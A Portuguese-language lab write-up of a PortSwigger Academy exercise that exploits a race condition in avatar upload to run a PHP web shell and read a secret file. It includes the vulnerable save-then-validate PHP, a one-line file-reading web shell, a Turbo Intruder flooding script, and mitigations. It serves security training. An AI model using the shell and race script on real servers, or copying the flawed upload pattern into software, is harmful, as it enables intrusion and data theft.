---
title: "Upload de Web Shell via Race Condition"
platform: "PortSwigger"
category: "Race Conditions"
difficulty: "Practitioner"
date: 2026-04-15
techniques: ["File Upload Race", "PHP Web Shell", "RCE"]
description: "Race em upload de arquivo — a janela entre `move_uploaded_file()` e a validação permite executar uma web shell PHP antes da deleção, escalando pra RCE."
lang: pt-br
translation_key: race-condition-file-upload
permalink: /writeups/race-condition-file-upload/pt/
---

## Plataforma
PortSwigger Web Security Academy

## Categoria
Race Conditions / File Upload

## Dificuldade
Practitioner

## Objetivo
Fazer upload de uma web shell PHP explorando uma race condition no processo de validação de arquivo, e depois exfiltrar o conteúdo de `/home/carlos/secret`.

---

## Contexto

O lab tem uma função de upload de avatar que faz validação no servidor. O fluxo de validação é vulnerável a race condition: o servidor primeiro salva o arquivo em disco, depois valida (checa o tipo), e deleta se for inválido. Durante a janela entre o arquivo ser salvo e ser deletado, um atacante pode acessar e executar o PHP enviado.

---

## Reconhecimento

### Credenciais
- **Username:** wiener
- **Password:** peter

### Endpoints Principais

| Endpoint | Método | Propósito |
|---|---|---|
| `/my-account/avatar` | POST | Upload de avatar |
| `/files/avatars/<filename>` | GET | Acessar avatar enviado |
| `/my-account` | GET | Página da conta com formulário de upload |

### Comportamento da Validação de Upload
Fazer upload de `.php` retorna **403 Forbidden** com a mensagem "Sorry, only JPG & PNG files are allowed." Porém, o servidor salva o arquivo temporariamente antes de validar e deletar — criando uma janela de race.

### Código Vulnerável do Servidor
```php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];
// move temporário — ARQUIVO EXISTE EM DISCO AQUI
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);
if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file has been uploaded.";
} else {
    unlink($target_file);  // DELETE — mas a janela de race já passou
    echo "Sorry, there was an error uploading your file.";
}
```

A janela de race existe entre `move_uploaded_file()` (arquivo salvo) e `unlink()` (arquivo deletado).

---

## Exploração

### Fluxo Vulnerável
```
POST /my-account/avatar (exploit.php):
  Step 1: move_uploaded_file() → ARQUIVO SALVO EM DISCO  ←── JANELA DE RACE
  Step 2: checkViruses() + checkFileType()                       ↑
  Step 3: unlink() → ARQUIVO DELETADO                   GET /files/avatars/exploit.php
                                                        chega aqui → PHP EXECUTA!
```

### Passos do Ataque

1. **Criei a web shell PHP** no Kali:
```bash
echo '<?php echo file_get_contents("/home/carlos/secret"); ?>' > /tmp/exploit.php
```

2. **Fiz upload do exploit.php** como avatar pelo navegador — recebi 403 "only JPG & PNG files are allowed" como esperado

3. **Capturei o POST /my-account/avatar** no HTTP History do Burp

4. **Enviei pro Turbo Intruder** — botão direito → Extensions → Turbo Intruder → Send to Turbo Intruder

5. **Configurei o script do Turbo Intruder** — 1 upload + 50 GET requests por tentativa, 20 tentativas:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)

    getReq = '''GET /files/avatars/exploit.php HTTP/2
Host: 0ac6003b038b9b7e82d1cf3b003a00ab.web-security-academy.net
Cookie: session=XxIGJEme1bBWLJ1CLIo3sYOqsc53vhVI

'''

    for attempt in range(20):
        engine.queue(target.req, gate=str(attempt))
        for i in range(50):
            engine.queue(getReq, gate=str(attempt))
        engine.openGate(str(attempt))

def handleResponse(req, interesting):
    if 'secret' in req.response or req.status == 200:
        table.add(req)
```

6. **Lancei o ataque** — 20 tentativas × 51 requisições = 1.020 requisições no total

7. **Análise dos resultados** — várias requisições GET retornaram 200 com Content-Length 32, contendo o secret

8. **Extraí o secret:** `8Yn0bj3aISfGVTKF3yNa8o5QY7ndxF6v`

9. **Submeti a solução** — lab solved

### Resultado
- **RCE alcançada** via race condition em upload de arquivo
- **Secret exfiltrado:** `8Yn0bj3aISfGVTKF3yNa8o5QY7ndxF6v`
- **Múltiplos hits bem-sucedidos** — a janela de race era larga o suficiente para várias requisições GET passarem

---

## Mapeamento MITRE ATT&CK

| Tática | Técnica | ID |
|---|---|---|
| Execution | Exploitation for Client Execution | T1203 |
| Persistence | Server Software Component: Web Shell | T1505.003 |
| Collection | Data from Local System | T1005 |

### CWE
- **CWE-362:** Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)
- **CWE-434:** Unrestricted Upload of File with Dangerous Type

---

## Conceitos-Chave Aprendidos

| Conceito | Descrição |
|---|---|
| Race Condition em File Upload | Explorar a janela entre o arquivo ser salvo e ser validado/deletado |
| Anti-Padrão "Salvar-depois-Validar" | Servidor salva o arquivo antes de checar o tipo — qualquer arquivo existe em disco temporariamente |
| Web Shell PHP | Script PHP simples que executa código no servidor: `<?php echo file_get_contents(...); ?>` |
| GET Flooding em Paralelo | Enviar 50 GETs por tentativa de upload maximiza a chance de pegar a janela de race |
| RCE via Race Condition | Combinar bypass de upload com race condition alcança Remote Code Execution |

---

## Ferramentas Utilizadas

| Ferramenta | Propósito |
|---|---|
| Burp Suite Community | Proxy, HTTP History |
| Turbo Intruder | Upload paralelo + GETs com mecanismo de gate |
| Terminal do Kali Linux | Criação da web shell PHP (comando `echo`) |
| Firefox (Kali) | Navegador com proxy, submissão do secret |

---

## Cheatsheet de Comandos & Técnicas

```
# Fluxo de Ataque de Race Condition em File Upload

# 1. Criar a web shell PHP
echo '<?php echo file_get_contents("/home/carlos/secret"); ?>' > /tmp/exploit.php

# 2. Fazer upload via navegador pra capturar o POST
# 3. Enviar POST /my-account/avatar pro Turbo Intruder
# 4. Script: 1 upload + 50 GETs por gate, 20 tentativas
# 5. Procurar respostas 200 com Content-Length pequeno (o secret)
# 6. Submeter a string do secret pra resolver o lab
```

---

## Mitigação

Para prevenir race conditions em file upload:

- **Validar antes de salvar:** Checar tipo, extensão e conteúdo ANTES de gravar em disco — nunca salvar e depois validar
- **Usar diretório temporário:** Fazer upload pra um diretório temporário não acessível pela web, validar lá, e só mover pro diretório público se for válido
- **Randomizar nomes de arquivo:** Gerar nomes aleatórios no upload pra que atacantes não possam prever a URL durante a janela de race
- **Move atômico:** Usar processo em duas etapas onde o arquivo só fica acessível depois da validação completar (ex: renomear de `.tmp` pra extensão final)
- **Desabilitar execução de PHP no diretório de upload:** Configurar o servidor pra nunca executar PHP no diretório de avatars (`php_flag engine off` no `.htaccess`)

---

## Reflexão

Esse lab demonstra como race conditions podem escalar restrições de file upload pra Remote Code Execution completa. O padrão "salvar-depois-validar" do servidor é um anti-padrão comum — cria uma janela onde qualquer tipo de arquivo existe em disco e é acessível via web server. O ataque é direto uma vez que você entende o padrão: bombardear GETs em paralelo com o upload, e pelo menos um vai pegar o arquivo antes da deleção. Em contexto de bug bounty real, isso seria um achado de severidade Crítica (RCE) e provavelmente pagaria o bounty máximo. Esse lab também mostra a interseção de race conditions com outras classes de vulnerabilidade — a restrição de file upload é robusta quando testada sequencialmente, mas completamente burlada via acesso concorrente.
